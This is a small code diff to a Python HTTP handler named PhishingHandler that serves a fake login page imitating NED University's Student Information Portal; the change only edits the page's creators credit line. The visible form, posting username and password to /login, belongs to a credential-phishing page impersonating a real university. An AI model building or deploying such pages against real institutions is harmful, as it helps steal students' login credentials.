@@ -152,7 +152,7 @@ class PhishingHandler(BaseHTTPRequestHandler):
         <div class="login-box">
             <h1>NED University</h1>
             <h2>Student Information Portal</h2>
-            <h6>Created By : Muhammad Araiz, Muhammad Shuja, Muhammad Ahmed ( MSA ) </h6>
+            <h6>Created By : Muhammad Araiz, Muhammad Shuja, Muhammad Ahmed (ASA) </h6>
             <form method="POST" action="/login">
                 <div class="input-group">
                     <label for="username">Username:</label>
